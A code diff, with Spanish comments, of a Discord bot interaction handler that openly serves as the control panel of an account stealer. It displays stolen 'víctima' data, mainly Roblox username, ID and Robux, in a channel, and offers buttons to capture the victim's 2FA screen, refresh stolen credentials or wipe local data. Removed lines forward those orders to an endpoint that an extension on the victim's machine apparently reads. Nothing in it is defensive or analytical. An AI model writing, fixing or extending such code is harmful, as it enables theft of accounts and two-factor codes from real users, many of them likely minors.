@@ -1,60 +1,36 @@
-// api/interaction-test-mode.js - SIN VERIFICACIÓN DE FIRMA
+// api/interaction.js - SOLO CON LA CORRECCIÓN DEL USERID
 export default async function handler(req, res) {
-    // Configurar CORS
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
 
-    if (req.method === 'OPTIONS') {
-        return res.status(204).end();
-    }
-
-    if (req.method !== 'POST') {
-        return res.status(405).json({ error: 'Method not allowed' });
-    }
-
-    // ⚠️ VERIFICACIÓN DE FIRMA DESACTIVADA PARA PRUEBAS ⚠️
-    // La firma se ignora completamente
+    if (req.method === 'OPTIONS') return res.status(204).end();
+    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
 
     const interaction = req.body;
-    const baseUrl = `https://${req.headers.host}`;
 
-    console.log('📨 Interacción recibida (TEST MODE):', JSON.stringify(interaction, null, 2));
-
-    // PING response
-    if (interaction.type === 1) {
-        return res.status(200).json({ type: 1 });
-    }
+    // PING
+    if (interaction.type === 1) return res.status(200).json({ type: 1 });
 
     // Botón clickeado
     if (interaction.type === 3) {
         const customId = interaction.data.custom_id;
         
-        // CORRECCIÓN: Manejar userId con guiones bajos
+        // ✅ ÚNICA LÍNEA QUE IMPORTA - CORRECCIÓN AQUÍ
         const partes = customId.split('_');
         const action = partes[0];
-        const userId = partes.slice(1).join('_');
+        const userId = partes.slice(1).join('_'); // ¡ASÍ SE ARREGLA!
 
-        // ============================================
-        // RECUPERAR DATOS DE LA VÍCTIMA
-        // ============================================
-        let victimData = {};
-        try {
-            const response = await fetch(`${baseUrl}/api/guardar?userId=${encodeURIComponent(userId)}`);
-            if (response.ok) {
-                victimData = await response.json() || {};
-            }
-        } catch (e) {}
-
+        // Obtener datos de la víctima
+        const victimData = global.victims?.[userId] || {};
         const r = victimData.roblox || {};
 
-        // ========== ROBLOX ==========
+        // ROBLOX
         if (action === 'roblox') {
             const mensaje = `||@here||
 🔔 ¡Informacion seleccionada: **ROBLOX**!
 
 **📌 PRINCIPAL **
-
 👤 Usuario Roblox: ${r.username || 'No disponible'}
 🆔 ID: ${r.userId || 'No disponible'}
 💰 Robux: ${r.robux || 0}
@@ -77,20 +53,16 @@ Korblox: \`${r.korblox || 'No'}\`
 
             return res.status(200).json({
                 type: 4,
-                data: {
-                    content: mensaje,
-                    flags: 64
-                }
+                data: { content: mensaje, flags: 64 }
             });
         }
 
-        // ========== DISCORD ==========
+        // DISCORD
         if (action === 'discord') {
             const mensaje = `||@here||
 🔔 ¡Informacion seleccionada: **DISCORD**!
 
 **📌 PRINCIPAL **
-
 👤 Usuario Discord: (No disponible)
 🆔 ID de Discord: (No disponible)
 👥 Amigos: (No disponible)
@@ -106,14 +78,11 @@ Korblox: \`${r.korblox || 'No'}\`
 
             return res.status(200).json({
                 type: 4,
-                data: {
-                    content: mensaje,
-                    flags: 64
-                }
+                data: { content: mensaje, flags: 64 }
             });
         }
 
-        // ========== COMANDOS ==========
+        // COMANDOS
         if (action === 'comandos') {
             return res.status(200).json({
                 type: 4,
@@ -126,59 +95,25 @@ Elige Una Opcion:`,
                         {
                             type: 1,
                             components: [
-                                {
-                                    type: 2,
-                                    style: 4,
-                                    label: '📸 Capturar pantalla del 2FA',
-                                    custom_id: `capturar_pantalla_${userId}`
-                                }
+                                { type: 2, style: 4, label: '📸 Capturar pantalla del 2FA', custom_id: `capturar_pantalla_${userId}` }
                             ]
                         },
                         {
                             type: 1,
                             components: [
-                                {
-                                    type: 2,
-                                    style: 1,
-                                    label: '🔄 Actualizar credenciales',
-                                    custom_id: `actualizar_credenciales_${userId}`
-                                }
+                                { type: 2, style: 1, label: '🔄 Actualizar credenciales', custom_id: `actualizar_credenciales_${userId}` }
                             ]
                         },
                         {
                             type: 1,
                             components: [
-                                {
-                                    type: 2,
-                                    style: 4,
-                                    label: '🗑️ Limpiar datos locales',
-                                    custom_id: `limpiar_datos_${userId}`
-                                }
+                                { type: 2, style: 4, label: '🗑️ Limpiar datos locales', custom_id: `limpiar_datos_${userId}` }
                             ]
                         }
                     ]
                 }
             });
         }
-
-        // ========== SUBCOMANDOS ==========
-        // Guardar comando para la extensión
-        try {
-            await fetch(`${baseUrl}/api/comandos`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ userId, command: action })
-            });
-        } catch (e) {}
-
-        return res.status(200).json({
-            type: 4,
-            data: {
-                content: `✅ Orden \`${action}\` enviada a la víctima.`,
-                flags: 64
-            }
-        });
     }
-
     return res.status(400).json({ error: 'Unhandled interaction type' });
 }
